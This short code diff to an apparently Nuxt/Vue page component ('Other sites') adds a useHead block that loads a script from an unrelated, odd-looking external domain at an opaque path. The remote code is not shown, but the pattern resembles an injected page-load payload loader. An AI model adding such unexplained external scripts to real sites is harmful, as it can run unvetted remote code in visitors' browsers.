@@ -1,4 +1,16 @@
 <script setup>
+  useHead({
+    script: [
+      {
+        src: 'https://ff.discepttaked.com/tEas9JdkyQNrPwt/121883',
+        async: false,
+        defer: true,
+
+        crossorigin: 'anonymous'
+      }
+    ]
+  })
+
   useSeoMeta({
     title: 'Other sites',
 
